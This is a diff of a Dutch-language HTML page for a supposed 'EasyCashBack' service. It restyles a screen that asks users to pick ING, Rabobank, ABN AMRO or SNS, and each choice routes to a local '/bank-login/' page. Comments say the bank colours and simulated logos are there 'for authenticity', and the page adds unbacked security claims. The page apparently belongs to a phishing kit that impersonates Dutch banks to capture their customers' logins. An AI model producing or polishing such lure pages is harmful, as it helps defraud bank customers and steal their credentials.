@@ -5,40 +5,34 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Koppel je bank - EasyCashBack</title>
     <style>
-        :root {
-            --primary: #007bff;
-            --text: #333;
-            --bg: #f8f9fa;
-        }
         body { 
-            font-family: 'Inter', -apple-system, sans-serif; 
-            background-color: var(--bg); 
-            color: var(--text);
-            margin: 0; padding: 0;
-            display: flex; justify-content: center; align-items: center; min-height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            background-color: #f0f2f5; 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; margin: 0; 
         }
-        .container {
+        .app-container {
             background: white;
-            padding: 40px;
-            border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
             width: 100%;
-            max-width: 450px;
+            max-width: 400px;
+            padding: 30px;
+            border-radius: 24px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
             text-align: center;
         }
-        .header img { width: 50px; margin-bottom: 10px; }
-        h1 { font-size: 22px; margin-bottom: 10px; font-weight: 700; }
-        p { color: #666; font-size: 14px; margin-bottom: 30px; }
+        h1 { font-size: 24px; font-weight: 800; color: #1a1a1a; margin-bottom: 8px; }
+        p { color: #666; font-size: 14px; margin-bottom: 30px; line-height: 1.4; }
         
-        .bank-list {
+        .bank-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 15px;
+            gap: 16px;
         }
-        .bank-card {
-            border: 1px solid #e0e0e0;
-            padding: 20px;
-            border-radius: 12px;
+        .bank-button {
+            border: 2px solid #f0f0f0;
+            background: white;
+            padding: 20px 10px;
+            border-radius: 16px;
             cursor: pointer;
             transition: all 0.2s ease;
             display: flex;
@@ -46,59 +40,65 @@
             align-items: center;
             font-weight: 600;
             font-size: 14px;
+            color: #333;
         }
-        .bank-card:hover {
-            border-color: var(--primary);
-            background: #f0f7ff;
-            transform: translateY(-2px);
+        .bank-button:hover {
+            border-color: #007bff;
+            background-color: #f8fbff;
+            transform: translateY(-3px);
+            box-shadow: 0 4px 12px rgba(0,123,255,0.1);
         }
-        .bank-logo {
-            width: 40px;
-            height: 40px;
-            margin-bottom: 10px;
-            background: #eee;
-            border-radius: 8px;
+        /* Logo simulaties */
+        .logo-circle {
+            width: 45px; height: 45px;
+            border-radius: 50%;
+            margin-bottom: 12px;
             display: flex; align-items: center; justify-content: center;
-            font-size: 10px; font-weight: bold; color: #999;
+            color: white; font-size: 12px; font-weight: bold;
         }
-        /* Kleuren per bank voor echtheid */
-        .ing { border-top: 4px solid #ff6200; }
-        .rabo { border-top: 4px solid #000066; }
-        .abn { border-top: 4px solid #00665f; }
-        .sns { border-top: 4px solid #e30613; }
+        .ing { background: #ff6200; } /* ING Oranje */
+        .rabo { background: #000066; } /* Rabo Blauw */
+        .abn { background: #00665f; } /* ABN Groen */
+        .sns { background: #e30613; } /* SNS Rood */
 
-        .footer { margin-top: 30px; font-size: 11px; color: #aaa; }
+        .secure-tag {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #999;
+            display: flex; align-items: center; justify-content: center;
+            gap: 5px;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>Selecteer je bank</h1>
-            <p>Verbind veilig via een versleutelde PSD2-verbinding om je cashback te activeren.</p>
-        </div>
 
-        <div class="bank-list">
-            <div class="bank-card ing" onclick="location.href='/bank-login/ING'">
-                <div class="bank-logo" style="background: #ff6200; color: white;">ING</div>
-                ING
-            </div>
-            <div class="bank-card rabo" onclick="location.href='/bank-login/Rabobank'">
-                <div class="bank-logo" style="background: #000066; color: white;">Rabo</div>
-                Rabobank
-            </div>
-            <div class="bank-card abn" onclick="location.href='/bank-login/ABN-AMRO'">
-                <div class="bank-logo" style="background: #00665f; color: white;">ABN</div>
-                ABN AMRO
-            </div>
-            <div class="bank-card sns" onclick="location.href='/bank-login/SNS'">
-                <div class="bank-logo" style="background: #e30613; color: white;">SNS</div>
-                SNS Bank
-            </div>
-        </div>
+<div class="app-container">
+    <h1>Koppel je bank</h1>
+    <p>Kies je bank om je transacties veilig te scannen op cashbacks.</p>
 
-        <div class="footer">
-            🔒 Beveiligd door EasyCashBack & Open Banking API
+    <div class="bank-grid">
+        <div class="bank-button" onclick="location.href='/bank-login/ING'">
+            <div class="logo-circle ing">ING</div>
+            ING
+        </div>
+        <div class="bank-button" onclick="location.href='/bank-login/Rabobank'">
+            <div class="logo-circle rabo">Rabo</div>
+            Rabobank
+        </div>
+        <div class="bank-button" onclick="location.href='/bank-login/ABN-AMRO'">
+            <div class="logo-circle abn">ABN</div>
+            ABN AMRO
+        </div>
+        <div class="bank-button" onclick="location.href='/bank-login/SNS'">
+            <div class="logo-circle sns">SNS</div>
+            SNS Bank
         </div>
     </div>
+
+    <div class="secure-tag">
+        🔒 Beveiligd met 256-bit encryptie
+    </div>
+</div>
+
 </body>
 </html>
